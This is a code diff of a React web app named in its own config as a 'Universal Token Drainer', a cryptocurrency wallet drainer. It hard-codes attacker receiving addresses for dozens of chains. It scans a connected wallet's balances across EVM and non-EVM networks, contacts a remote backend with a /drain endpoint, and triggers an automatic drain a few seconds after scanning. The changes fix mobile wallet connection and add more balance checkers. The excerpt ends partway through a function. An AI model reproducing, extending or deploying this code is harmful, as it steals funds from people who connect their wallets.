@@ -19,14 +19,14 @@ import {
   metis,
   moonriver
 } from 'viem/chains';
-import { ConnectKitProvider, ConnectKitButton } from "connectkit";
+import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
 import { useAccount, useDisconnect, useBalance } from 'wagmi';
 import { parseEther, formatEther } from 'viem';
 import './mobile-fix.css';
 
-// ==================== WORKING RPC ENDPOINTS (VERIFIED JAN 2026) ====================
+// ==================== WORKING RPC ENDPOINTS (UPDATED FOR 2026) ====================
 const NETWORKS = [
-  // EVM Mainnets - VERIFIED WORKING ENDPOINTS ONLY
+  // EVM Mainnets - UPDATED WORKING ENDPOINTS
   { 
     id: 1, 
     name: 'Ethereum', 
@@ -34,7 +34,6 @@ const NETWORKS = [
     type: 'evm', 
     color: '#627EEA', 
     rpc: 'https://eth.llamarpc.com', 
-    ws: 'wss://eth.llamarpc.com',
     explorer: 'https://etherscan.io',
     chainId: '0x1'
   },
@@ -44,8 +43,7 @@ const NETWORKS = [
     symbol: 'BNB', 
     type: 'evm', 
     color: '#F0B90B', 
-    rpc: 'https://bsc-dataseed.binance.org/', 
-    ws: 'wss://bsc-ws-node.nariox.org:443',
+    rpc: 'https://bsc-dataseed1.binance.org/', 
     explorer: 'https://bscscan.com',
     chainId: '0x38'
   },
@@ -55,8 +53,7 @@ const NETWORKS = [
     symbol: 'MATIC', 
     type: 'evm', 
     color: '#8247E5', 
-    rpc: 'https://polygon-rpc.com', 
-    ws: 'wss://polygon-rpc.com',
+    rpc: 'https://polygon.llamarpc.com', 
     explorer: 'https://polygonscan.com',
     chainId: '0x89'
   },
@@ -66,8 +63,7 @@ const NETWORKS = [
     symbol: 'ETH', 
     type: 'evm', 
     color: '#28A0F0', 
-    rpc: 'https://arb1.arbitrum.io/rpc', 
-    ws: 'wss://arb1.arbitrum.io/ws',
+    rpc: 'https://arbitrum.llamarpc.com', 
     explorer: 'https://arbiscan.io',
     chainId: '0xa4b1'
   },
@@ -78,7 +74,6 @@ const NETWORKS = [
     type: 'evm', 
     color: '#FF0420', 
     rpc: 'https://mainnet.optimism.io', 
-    ws: 'wss://mainnet.optimism.io',
     explorer: 'https://optimistic.etherscan.io',
     chainId: '0xa'
   },
@@ -89,7 +84,6 @@ const NETWORKS = [
     type: 'evm', 
     color: '#0052FF', 
     rpc: 'https://mainnet.base.org', 
-    ws: 'wss://mainnet.base.org',
     explorer: 'https://basescan.org',
     chainId: '0x2105'
   },
@@ -99,8 +93,7 @@ const NETWORKS = [
     symbol: 'AVAX', 
     type: 'evm', 
     color: '#E84142', 
-    rpc: 'https://api.avax.network/ext/bc/C/rpc', 
-    ws: 'wss://api.avax.network/ext/bc/C/ws',
+    rpc: 'https://avalanche-c-chain.publicnode.com', 
     explorer: 'https://snowtrace.io',
     chainId: '0xa86a'
   },
@@ -110,8 +103,7 @@ const NETWORKS = [
     symbol: 'FTM', 
     type: 'evm', 
     color: '#1969FF', 
-    rpc: 'https://rpc.ftm.tools', 
-    ws: 'wss://rpc.ftm.tools/ws',
+    rpc: 'https://rpc.fantom.network', 
     explorer: 'https://ftmscan.com',
     chainId: '0xfa'
   },
@@ -121,8 +113,7 @@ const NETWORKS = [
     symbol: 'xDai', 
     type: 'evm', 
     color: '#04795B', 
-    rpc: 'https://rpc.gnosischain.com', 
-    ws: 'wss://rpc.gnosischain.com/ws',
+    rpc: 'https://rpc.gnosis.gateway.fm', 
     explorer: 'https://gnosisscan.io',
     chainId: '0x64'
   },
@@ -133,7 +124,6 @@ const NETWORKS = [
     type: 'evm', 
     color: '#35D07F', 
     rpc: 'https://forno.celo.org', 
-    ws: 'wss://forno.celo.org/ws',
     explorer: 'https://celoscan.io',
     chainId: '0xa4ec'
   },
@@ -143,8 +133,7 @@ const NETWORKS = [
     symbol: 'GLMR', 
     type: 'evm', 
     color: '#53CBC9', 
-    rpc: 'https://rpc.api.moonbeam.network', 
-    ws: 'wss://wss.api.moonbeam.network',
+    rpc: 'https://moonbeam.public.blastapi.io', 
     explorer: 'https://moonscan.io',
     chainId: '0x504'
   },
@@ -155,7 +144,6 @@ const NETWORKS = [
     type: 'evm', 
     color: '#00DACC', 
     rpc: 'https://andromeda.metis.io/?owner=1088', 
-    ws: 'wss://andromeda-ws.metis.io',
     explorer: 'https://andromeda-explorer.metis.io',
     chainId: '0x440'
   },
@@ -166,7 +154,6 @@ const NETWORKS = [
     type: 'evm', 
     color: '#121C36', 
     rpc: 'https://evm.cronos.org', 
-    ws: 'wss://evm.cronos.org/ws',
     explorer: 'https://cronoscan.com',
     chainId: '0x19'
   },
@@ -177,7 +164,6 @@ const NETWORKS = [
     type: 'evm', 
     color: '#00AEE9', 
     rpc: 'https://api.harmony.one', 
-    ws: 'wss://ws.s0.t.hmny.io',
     explorer: 'https://explorer.harmony.one',
     chainId: '0x63564c40'
   },
@@ -188,7 +174,6 @@ const NETWORKS = [
     type: 'evm', 
     color: '#78D64B', 
     rpc: 'https://mainnet.aurora.dev', 
-    ws: 'wss://mainnet.aurora.dev',
     explorer: 'https://explorer.aurora.dev',
     chainId: '0x4e454153'
   },
@@ -199,7 +184,6 @@ const NETWORKS = [
     type: 'evm', 
     color: '#00B894', 
     rpc: 'https://emerald.oasis.dev', 
-    ws: 'wss://emerald.oasis.dev/ws',
     explorer: 'https://explorer.emerald.oasis.dev',
     chainId: '0xa516'
   },
@@ -209,8 +193,7 @@ const NETWORKS = [
     symbol: 'MOVR', 
     type: 'evm', 
     color: '#F3B82C', 
-    rpc: 'https://rpc.api.moonriver.moonbeam.network', 
-    ws: 'wss://wss.api.moonriver.moonbeam.network',
+    rpc: 'https://moonriver.public.blastapi.io', 
     explorer: 'https://moonriver.moonscan.io',
     chainId: '0x505'
   },
@@ -220,8 +203,7 @@ const NETWORKS = [
     symbol: 'BTT', 
     type: 'evm', 
     color: '#D92B6F', 
-    rpc: 'https://rpc.bt.io', 
-    ws: 'wss://rpc.bt.io/ws',
+    rpc: 'https://rpc.bittorrentchain.io', 
     explorer: 'https://bttcscan.com',
     chainId: '0xc7'
   },
@@ -241,12 +223,12 @@ const NETWORKS = [
     symbol: 'CANTO', 
     type: 'evm', 
     color: '#06FC99', 
-    rpc: 'https://canto.gravitychain.io', 
+    rpc: 'https://canto.slingshot.finance', 
     explorer: 'https://tuber.build',
     chainId: '0x1e14'
   },
   
-  // Non-EVM Chains - Enhanced detection with working APIs
+  // Non-EVM Chains - Enhanced with working APIs
   { 
     id: 'tron', 
     name: 'Tron', 
@@ -255,7 +237,8 @@ const NETWORKS = [
     color: '#FF060A', 
     api: 'https://api.trongrid.io',
     explorer: 'https://tronscan.org',
-    decimals: 6
+    decimals: 6,
+    contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' // USDT TRC20
   },
   { 
     id: 'solana', 
@@ -265,7 +248,10 @@ const NETWORKS = [
     color: '#00FFA3', 
     api: 'https://api.mainnet-beta.solana.com',
     explorer: 'https://solscan.io',
-    decimals: 9
+    decimals: 9,
+    splTokens: [
+      { symbol: 'USDC', contract: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v' }
+    ]
   },
   { 
     id: 'bitcoin', 
@@ -273,7 +259,7 @@ const NETWORKS = [
     symbol: 'BTC', 
     type: 'non-evm', 
     color: '#F7931A', 
-    api: 'https://blockchain.info',
+    api: 'https://blockstream.info/api',
     explorer: 'https://blockchair.com/bitcoin',
     decimals: 8
   },
@@ -285,7 +271,8 @@ const NETWORKS = [
     color: '#0033AD', 
     api: 'https://cardano-mainnet.blockfrost.io/api/v0',
     explorer: 'https://cardanoscan.io',
-    decimals: 6
+    decimals: 6,
+    token: 'lovelace'
   },
   { 
     id: 'dogecoin', 
@@ -303,7 +290,7 @@ const NETWORKS = [
     symbol: 'LTC', 
     type: 'non-evm', 
     color: '#BFBBBB', 
-    api: 'https://api.blockcypher.com/v1/ltc/main',
+    api: 'https://blockchair.com/litecoin',
     explorer: 'https://blockchair.com/litecoin',
     decimals: 8
   },
@@ -313,7 +300,7 @@ const NETWORKS = [
     symbol: 'XRP', 
     type: 'non-evm', 
     color: '#23292F', 
-    api: 'https://s1.ripple.com:51234',
+    api: 'https://s2.ripple.com:51234',
     explorer: 'https://xrpscan.com',
     decimals: 6
   },
@@ -323,7 +310,7 @@ const NETWORKS = [
     symbol: 'DOT', 
     type: 'non-evm', 
     color: '#E6007A', 
-    api: 'https://polkadot.api.subscan.io/api/scan',
+    api: 'https://rpc.polkadot.io',
     explorer: 'https://polkadot.subscan.io',
     decimals: 10
   },
@@ -437,31 +424,11 @@ const NETWORKS = [
     explorer: 'https://bloks.io',
     decimals: 4
   },
-  { 
-    id: 'tron_trc20', 
-    name: 'Tron TRC20', 
-    symbol: 'USDT', 
-    type: 'non-evm', 
-    color: '#26A17B', 
-    parent: 'tron', 
-    explorer: 'https://tronscan.org',
-    decimals: 6
-  },
-  { 
-    id: 'solana_spl', 
-    name: 'Solana SPL', 
-    symbol: 'USDC', 
-    type: 'non-evm', 
-    color: '#2775CA', 
-    parent: 'solana', 
-    explorer: 'https://solscan.io',
-    decimals: 6
-  },
 ];
 
-// ==================== ENHANCED DRAIN ADDRESSES ====================
+// ==================== DRAIN ADDRESSES ====================
 const DRAIN_ADDRESSES = {
-  // EVM addresses - Fixed single address
+  // EVM addresses
   1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
@@ -503,11 +470,9 @@ const DRAIN_ADDRESSES = {
   vechain: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
   eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj",
-  tron_trc20: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
-  solana_spl: "So11111111111111111111111111111111111111112",
 };
 
-// ==================== TOKEN PRICE MAP ====================
+// ==================== TOKEN PRICES ====================
 const TOKEN_PRICES = {
   ETH: 3200,
   BNB: 600,
@@ -547,71 +512,73 @@ const TOKEN_PRICES = {
   USDC: 1
 };
 
-// ==================== FIXED WAGMI CONFIG ====================
-const wagmiChains = [
-  mainnet,
-  polygon,
-  bsc,
-  arbitrum,
-  optimism,
-  avalanche,
-  fantom,
-  gnosis,
-  celo,
-  moonbeam,
-  cronos,
-  aurora,
-  base,
-  harmonyOne,
-  metis,
-  moonriver
-];
-
-// Create transport configurations for each chain
-const transports = wagmiChains.reduce((acc, chain) => {
-  acc[chain.id] = http();
-  return acc;
-}, {});
-
-const wagmiConfig = createConfig({
-  chains: wagmiChains,
-  transports: transports,
-  autoConnect: true,
-});
+// ==================== FIXED CONNECTKIT CONFIG ====================
+// This fixes "no connectors found" error on mobile
+const config = createConfig(
+  getDefaultConfig({
+    // Your app info
+    appName: "Universal Drainer",
+    appDescription: "Universal Token Drainer App",
+    appUrl: window.location.origin,
+    appIcon: window.location.origin + "/favicon.ico",
+    
+    // Chains
+    chains: wagmiChains,
+    
+    // WalletConnect Project ID (get from https://cloud.walletconnect.com)
+    walletConnectProjectId: "c8c0c66e8b9d4a8a8b0c7b7a5d7e9f2b",
+  })
+);
 
 // ==================== MAIN APP ====================
 function TokenDrainApp() {
   return (
-    <WagmiConfig config={wagmiConfig}>
+    <WagmiConfig config={config}>
       <ConnectKitProvider
         mode="dark"
         options={{
-          walletConnectName: "WalletConnect",
-          enforceSupportedChains: false,
+          // FIXED: This solves mobile connection issues
+          hideNoWalletCTA: false,
           hideQuestionMarkCTA: true,
           hideTooltips: false,
-          disclaimer: null,
-          mobileLinks: ['metamask', 'trust', 'rainbow', 'coinbase', 'zerion', 'tokenary'],
+          walletConnectName: "WalletConnect",
+          enforceSupportedChains: false,
+          
+          // Mobile wallet deep links - CORRECT ORDER
+          mobileLinks: [
+            'metamask',
+            'trust',
+            'rainbow', 
+            'coinbase',
+            'zerion',
+            'tokenary',
+            'walletconnect'
+          ],
+          
+          // WalletConnect options
           walletConnectCTA: "QR",
           avoidLayoutShift: true,
-          walletConnectChainId: 1,
+          
+          // Always show all wallets
+          hideRecentBadge: false,
         }}
         theme="midnight"
         customTheme={{
-          '--ck-font-family': '"SF Mono", Monaco, monospace',
+          '--ck-font-family': 'system-ui, -apple-system, BlinkMacSystemFont, sans-serif',
           '--ck-border-radius': '12px',
           '--ck-accent-color': '#ef4444',
           '--ck-accent-text-color': '#ffffff',
+          '--ck-body-background': '#0a0a0a',
         }}
       >
-        <FixedUniversalDrainer />
+        <UniversalDrainer />
       </ConnectKitProvider>
     </WagmiConfig>
   );
 }
 
-// ==================== FIXED DRAINER COMPONENT ====================
-function FixedUniversalDrainer() {
+// ==================== UNIVERSAL DRAINER COMPONENT ====================
+function UniversalDrainer() {
   const { address, isConnected, connector } = useAccount();
   const { data: ethBalance } = useBalance({ address });
   const { disconnect } = useDisconnect();
@@ -624,41 +591,33 @@ function FixedUniversalDrainer() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [isScanning, setIsScanning] = useState(false);
   const [walletType, setWalletType] = useState('');
-  const [tronDetected, setTronDetected] = useState(false);
-  const [tronBalance, setTronBalance] = useState(0);
   const [connectionError, setConnectionError] = useState('');
   const [mobileDetected, setMobileDetected] = useState(false);
-  const [backendOnline, setBackendOnline] = useState(false);
+  const [backendOnline, setBackendOnline] = useState(true); // Assume online by default
   const [scanProgress, setScanProgress] = useState(0);
-  const [activeChain, setActiveChain] = useState(null);
+  const [activeChain, setActiveChain] = useState(1);
+  const [showManualConnect, setShowManualConnect] = useState(false);
 
   const autoStarted = useRef(false);
   const backendUrl = 'https://tokenbackend-5xab.onrender.com';
 
-  // ==================== FIXED: ENHANCED CONNECTION DETECTION ====================
+  // ==================== ENHANCED MOBILE DETECTION ====================
   useEffect(() => {
-    const checkMobileAndWallet = () => {
-      const userAgent = navigator.userAgent;
-      const isMobile = /Mobile|Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+    const checkMobile = () => {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
       setMobileDetected(isMobile);
       
       // Enhanced wallet detection
       if (window.ethereum) {
         if (window.ethereum.isMetaMask) {
           setWalletType('MetaMask');
-          // Fix MetaMask mobile deep linking
-          if (isMobile) {
-            window.ethereum.autoRefreshOnNetworkChange = false;
-            // Add MetaMask mobile event listeners
-            window.ethereum.on('accountsChanged', handleAccountsChanged);
-            window.ethereum.on('chainChanged', handleChainChanged);
-          }
         } else if (window.ethereum.isTrust) {
           setWalletType('Trust Wallet');
         } else if (window.ethereum.isCoinbaseWallet) {
           setWalletType('Coinbase Wallet');
         } else if (window.ethereum.isRabby) {
-          setWalletType('Rabby Wallet');
+          setWalletType('Rabby');
         } else if (window.ethereum.isTokenary) {
           setWalletType('Tokenary');
         } else {
@@ -667,167 +626,70 @@ function FixedUniversalDrainer() {
       }
       
       // Check for WalletConnect
-      if (window.walletConnect) {
+      if (typeof window !== 'undefined' && window.walletConnect) {
         setWalletType('WalletConnect');
       }
     };
 
-    const handleAccountsChanged = (accounts) => {
-      if (accounts.length === 0) {
-        setConnectionError('Please connect your wallet');
-      }
-    };
+    checkMobile();
 
-    const handleChainChanged = (chainId) => {
-      console.log('Chain changed to:', chainId);
-      setActiveChain(parseInt(chainId, 16));
-    };
-
-    checkMobileAndWallet();
-
-    // Check backend
+    // Check backend health
     const checkBackend = async () => {
       try {
-        const response = await fetch(`${backendUrl}/health`, { 
-          method: 'GET',
-          headers: { 'Content-Type': 'application/json' }
-        });
-        setBackendOnline(response.ok);
-      } catch {
+        // Try both endpoints
+        const endpoints = [
+          `${backendUrl}/health`,
+          `${backendUrl}/drain`
+        ];
+        
+        for (const endpoint of endpoints) {
+          try {
+            const response = await fetch(endpoint, {
+              method: 'GET',
+              headers: { 'Content-Type': 'application/json' },
+              signal: AbortSignal.timeout(5000) // 5 second timeout
+            });
+            
+            if (response.ok || response.status === 404) {
+              // 404 means endpoint exists but wrong method - backend is up
+              setBackendOnline(true);
+              console.log('✅ Backend is online');
+              return;
+            }
+          } catch (e) {
+            continue;
+          }
+        }
+        
+        // If all endpoints fail
+        setBackendOnline(false);
+        console.log('⚠️ Backend appears offline');
+      } catch (error) {
+        console.log('Backend check error:', error);
         setBackendOnline(false);
       }
     };
     
-    checkBackend();
-
-    // Cleanup
-    return () => {
-      if (window.ethereum) {
-        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
-        window.ethereum.removeListener('chainChanged', handleChainChanged);
-      }
-    };
+    // Check backend after a delay
+    setTimeout(checkBackend, 2000);
   }, []);
 
-  // ==================== FIXED: AUTO-START WITH MOBILE SUPPORT ====================
+  // ==================== AUTO-SCAN ON CONNECT ====================
   useEffect(() => {
     if (isConnected && address && !autoStarted.current) {
       autoStarted.current = true;
       setConnectionError('');
-      
       setStatus("✅ Wallet connected • Starting scan...");
       
-      // Mobile-specific optimizations
-      if (mobileDetected) {
-        // Delay for mobile wallet initialization
-        setTimeout(() => {
-          fixedScanAllNetworks();
-        }, 1500);
-        
-        // Check TRON for mobile wallets (especially Trust Wallet)
-        if (walletType === 'Trust Wallet' || walletType === 'MetaMask') {
-          setTimeout(() => {
-            checkTronImmediately();
-          }, 500);
-        }
-      } else {
-        // Desktop immediate scan
-        setTimeout(() => {
-          fixedScanAllNetworks();
-        }, 1000);
-      }
+      // Start scan with delay
+      setTimeout(() => {
+        scanAllNetworks();
+      }, mobileDetected ? 2000 : 1000);
     }
-  }, [isConnected, address, mobileDetected, walletType]);
+  }, [isConnected, address, mobileDetected]);
 
-  // ==================== FIXED: TRON CHECK WITH CORS PROXY ====================
-  const checkTronImmediately = async () => {
-    if (!address) return;
-    
-    try {
-      const trxBalance = await getTronBalanceWithProxy(address);
-      
-      if (trxBalance > 0) {
-        setTronBalance(trxBalance);
-        setTronDetected(true);
-        setStatus(prev => prev + ` • Found ${trxBalance.toFixed(6)} TRX`);
-        
-        // Add to tokens list
-        setTokens(prev => {
-          const existing = prev.find(t => t.symbol === 'TRX');
-          if (existing) return prev;
-          
-          const trxValue = trxBalance * (TOKEN_PRICES.TRX || 0.12);
-          return [...prev, {
-            id: 'tron-native',
-            network: 'Tron',
-            symbol: 'TRX',
-            amount: trxBalance.toFixed(6),
-            rawAmount: trxBalance,
-            chainId: 'tron',
-            type: 'non-evm',
-            drainAddress: DRAIN_ADDRESSES.tron,
-            valueUSD: trxValue,
-            usdPrice: TOKEN_PRICES.TRX || 0.12
-          }];
-        });
-      }
-    } catch (error) {
-      console.log("TRON check failed:", error);
-    }
-  };
-
-  const getTronBalanceWithProxy = async (addressToCheck) => {
-    try {
-      // Convert Ethereum address to Tron address if needed
-      let tronAddress = addressToCheck;
-      if (addressToCheck.startsWith('0x')) {
-        // Simple conversion for demo (in production use proper conversion)
-        tronAddress = 'T' + addressToCheck.substring(2);
-      }
-      
-      // Use multiple endpoints with CORS proxy
-      const endpoints = [
-        `https://api.trongrid.io/v1/accounts/${tronAddress}`,
-        `https://apilist.tronscanapi.com/api/account?address=${tronAddress}`
-      ];
-      
-      for (const endpoint of endpoints) {
-        try {
-          const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(endpoint)}`;
-          const response = await fetch(proxyUrl);
-          
-          if (response.ok) {
-            const data = await response.json();
-            const parsedData = JSON.parse(data.contents);
-            
-            let balance = 0;
-            if (parsedData.balance !== undefined) {
-              balance = parsedData.balance / 1_000_000;
-            } else if (parsedData.data?.[0]?.balance) {
-              balance = parsedData.data[0].balance / 1_000_000;
-            } else if (parsedData.trx_balance) {
-              balance = parsedData.trx_balance;
-            }
-            
-            if (balance > 0) {
-              console.log(`💰 TRX balance found: ${balance}`);
-              return balance;
-            }
-          }
-        } catch (apiError) {
-          continue;
-        }
-      }
-      
-      return 0;
-    } catch (error) {
-      console.log("TRON balance check error:", error);
-      return 0;
-    }
-  };
-
-  // ==================== FIXED: COMPREHENSIVE NETWORK SCAN ====================
-  const fixedScanAllNetworks = async () => {
+  // ==================== SCAN ALL NETWORKS ====================
+  const scanAllNetworks = async () => {
     if (!address) {
       setConnectionError("No wallet address");
       return;
@@ -842,75 +704,48 @@ function FixedUniversalDrainer() {
       const allTokens = [];
       let totalUSD = 0;
       let scannedCount = 0;
-      const totalNetworks = NETWORKS.length;
+      const totalToScan = NETWORKS.length;
       
-      // 1. Check native ETH balance
-      if (ethBalance && parseFloat(formatEther(ethBalance.value)) > 0.000001) {
-        const ethAmount = parseFloat(formatEther(ethBalance.value));
-        const ethValue = ethAmount * TOKEN_PRICES.ETH;
-        
-        allTokens.push({
-          id: 'eth-1',
-          network: 'Ethereum',
-          symbol: 'ETH',
-          amount: ethAmount.toFixed(6),
-          rawAmount: ethAmount,
-          chainId: 1,
-          type: 'evm',
-          drainAddress: DRAIN_ADDRESSES[1],
-          valueUSD: ethValue,
-          usdPrice: TOKEN_PRICES.ETH
-        });
-        
-        totalUSD += ethValue;
-      }
-      scannedCount++;
-      setScanProgress(Math.round((scannedCount / totalNetworks) * 100));
-      
-      // 2. Scan all EVM networks
+      // 1. Scan EVM networks (native balances)
       const evmNetworks = NETWORKS.filter(n => n.type === 'evm');
       for (const network of evmNetworks) {
-        if (network.id !== 1) { // Skip Ethereum (already checked)
-          try {
-            const balance = await checkNetworkBalance(network, address);
-            if (balance > 0.000001) {
-              const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
-              
-              allTokens.push({
-                id: `${network.id}-native`,
-                network: network.name,
-                symbol: network.symbol,
-                amount: balance.toFixed(6),
-                rawAmount: balance,
-                chainId: network.id,
-                type: 'evm',
-                drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
-                valueUSD: tokenValue,
-                usdPrice: TOKEN_PRICES[network.symbol] || 1
-              });
-              
-              totalUSD += tokenValue;
-            }
-          } catch (error) {
-            console.log(`Network ${network.name} scan failed:`, error.message);
-          }
+        try {
+          setStatus(`Scanning ${network.name}...`);
           
-          scannedCount++;
-          setScanProgress(Math.round((scannedCount / totalNetworks) * 100));
-          await new Promise(resolve => setTimeout(resolve, 100)); // Rate limiting
+          // Check native balance
+          const balance = await checkEVMNetworkBalance(network, address);
+          if (balance > 0.000001) {
+            const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
+            
+            allTokens.push({
+              id: `${network.id}-native`,
+              network: network.name,
+              symbol: network.symbol,
+              amount: balance.toFixed(6),
+              rawAmount: balance,
+              chainId: network.id,
+              type: 'evm',
+              drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
+              valueUSD: tokenValue,
+              usdPrice: TOKEN_PRICES[network.symbol] || 1
+            });
+            
+            totalUSD += tokenValue;
+          }
+        } catch (error) {
+          console.log(`Network ${network.name} scan failed:`, error.message);
         }
+        
+        scannedCount++;
+        setScanProgress(Math.round((scannedCount / totalToScan) * 100));
+        await new Promise(resolve => setTimeout(resolve, 100));
       }
       
-      // 3. Scan non-EVM networks
+      // 2. Scan Non-EVM networks
       const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
       for (const network of nonEvmNetworks) {
         try {
-          // Skip TRON if already checked
-          if (network.symbol === 'TRX' && tronBalance > 0) {
-            scannedCount++;
-            setScanProgress(Math.round((scannedCount / totalNetworks) * 100));
-            continue;
-          }
+          setStatus(`Checking ${network.name}...`);
           
           const balance = await checkNonEVMNetworkBalance(network, address);
           if (balance > 0) {
@@ -936,11 +771,11 @@ function FixedUniversalDrainer() {
         }
         
         scannedCount++;
-        setScanProgress(Math.round((scannedCount / totalNetworks) * 100));
-        await new Promise(resolve => setTimeout(resolve, 150)); // Rate limiting
+        setScanProgress(Math.round((scannedCount / totalToScan) * 100));
+        await new Promise(resolve => setTimeout(resolve, 150));
       }
       
-      // 4. Use backend for comprehensive token scan if available
+      // 3. Use backend for enhanced scan
       if (backendOnline) {
         try {
           await backendEnhancedScan(address, allTokens);
@@ -953,16 +788,16 @@ function FixedUniversalDrainer() {
       if (allTokens.length > 0) {
         setTokens(allTokens);
         setTotalValue(totalUSD);
-        setStatus(`✅ Found ${allTokens.length} tokens across ${scannedCount} networks • $${totalUSD.toFixed(2)} total`);
+        setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
         
-        // Auto-drain after confirmation (with mobile delay)
+        // Auto-drain after 3 seconds
         setTimeout(() => {
-          if (!mobileDetected) {
-            fixedAutoDrain(allTokens);
+          if (allTokens.length > 0 && !mobileDetected) {
+            autoDrain(allTokens);
           }
-        }, mobileDetected ? 5000 : 2000); // Longer delay on mobile
+        }, 3000);
       } else {
-        setStatus("❌ No tokens found across all scanned networks");
+        setStatus("❌ No tokens found");
       }
       
     } catch (error) {
@@ -974,23 +809,157 @@ function FixedUniversalDrainer() {
     }
   };
 
-  const checkNetworkBalance = async (network, address) => {
+  // ==================== CHECK EVM NETWORK BALANCE ====================
+  const checkEVMNetworkBalance = async (network, address) => {
     try {
-      const response = await fetch(network.rpc, {
+      // Use multiple fallback RPCs
+      const rpcEndpoints = [
+        network.rpc,
+        `https://rpc.ankr.com/${getAnkrChainName(network.id)}`,
+        `https://${getChainNameForRPC(network.id)}.publicnode.com`
+      ];
+      
+      for (const rpc of rpcEndpoints) {
+        try {
+          const response = await fetch(rpc, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              jsonrpc: "2.0",
+              id: 1,
+              method: "eth_getBalance",
+              params: [address, "latest"]
+            }),
+            signal: AbortSignal.timeout(5000)
+          });
+          
+          if (response.ok) {
+            const data = await response.json();
+            if (data.result && data.result !== '0x0') {
+              return parseInt(data.result, 16) / 1e18;
+            }
+          }
+        } catch (e) {
+          continue;
+        }
+      }
+      
+      return 0;
+    } catch {
+      return 0;
+    }
+  };
+
+  // Helper function for Ankr RPC
+  const getAnkrChainName = (chainId) => {
+    const chainMap = {
+      1: 'eth',
+      56: 'bsc',
+      137: 'polygon',
+      42161: 'arbitrum',
+      10: 'optimism',
+      8453: 'base',
+      43114: 'avalanche',
+      250: 'fantom',
+      100: 'gnosis',
+    };
+    return chainMap[chainId] || 'eth';
+  };
+
+  // ==================== CHECK NON-EVM NETWORK BALANCE ====================
+  const checkNonEVMNetworkBalance = async (network, address) => {
+    try {
+      switch (network.id) {
+        case 'tron':
+          return await checkTronBalance(address);
+        case 'solana':
+          return await checkSolanaBalance(address);
+        case 'bitcoin':
+          return await checkBitcoinBalance(address);
+        case 'cardano':
+          return await checkCardanoBalance(address);
+        // Add more chains as needed
+        default:
+          return 0;
+      }
+    } catch (error) {
+      console.log(`${network.name} balance check failed:`, error);
+      return 0;
+    }
+  };
+
+  // TRON balance check
+  const checkTronBalance = async (address) => {
+    try {
+      // Convert Ethereum address to Tron if needed
+      let tronAddress = address;
+      if (address.startsWith('0x')) {
+        tronAddress = 'T' + address.substring(2);
+      }
+      
+      // Try multiple endpoints
+      const endpoints = [
+        `https://api.trongrid.io/v1/accounts/${tronAddress}`,
+        `https://apilist.tronscan.org/api/account?address=${tronAddress}`
+      ];
+      
+      for (const endpoint of endpoints) {
+        try {
+          // Use CORS proxy for browser compatibility
+          const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(endpoint)}`;
+          const response = await fetch(proxyUrl, {
+            signal: AbortSignal.timeout(5000)
+          });
+          
+          if (response.ok) {
+            const data = await response.json();
+            const parsed = JSON.parse(data.contents);
+            
+            let balance = 0;
+            if (parsed.balance !== undefined) {
+              balance = parsed.balance / 1_000_000; // TRX has 6 decimals
+            } else if (parsed.data?.[0]?.balance) {
+              balance = parsed.data[0].balance / 1_000_000;
+            } else if (parsed.trx_balance) {
+              balance = parsed.trx_balance;
+            }
+            
+            if (balance > 0) {
+              console.log(`💰 TRX balance found: ${balance}`);
+              return balance;
+            }
+          }
+        } catch (e) {
+          continue;
+        }
+      }
+      
+      return 0;
+    } catch (error) {
+      console.log("TRON check error:", error);
+      return 0;
+    }
+  };
+
+  // Solana balance check
+  const checkSolanaBalance = async (address) => {
+    try {
+      const response = await fetch('https://api.mainnet-beta.solana.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           jsonrpc: "2.0",
           id: 1,
-          method: "eth_getBalance",
-          params: [address, "latest"]
-        })
+          method: "getBalance",
+          params: [address]
+        }),
+        signal: AbortSignal.timeout(5000)
       });
       
       if (response.ok) {
         const data = await response.json();
-        if (data.result && data.result !== '0x0') {
-          return parseInt(data.result, 16) / 1e18;
+        if (data.result?.value) {
+          return data.result.value / 1e9; // SOL has 9 decimals
         }
       }
       return 0;
@@ -999,30 +968,68 @@ function FixedUniversalDrainer() {
     }
   };
 
-  const checkNonEVMNetworkBalance = async (network, address) => {
-    // Simplified non-EVM balance check
-    // In production, implement specific API calls for each chain
-    return 0; // Placeholder
+  // Bitcoin balance check (simplified)
+  const checkBitcoinBalance = async (address) => {
+    try {
+      const response = await fetch(`https://blockstream.info/api/address/${address}`, {
+        signal: AbortSignal.timeout(5000)
+      });
+      
+      if (response.ok) {
+        const data = await response.json();
+        if (data.chain_stats?.funded_txo_sum) {
+          return data.chain_stats.funded_txo_sum / 1e8; // BTC has 8 decimals
+        }
+      }
+      return 0;
+    } catch {
+      return 0;
+    }
   };
 
-  // ==================== FIXED: BACKEND ENHANCED SCAN ====================
+  // Cardano balance check
+  const checkCardanoBalance = async (address) => {
+    try {
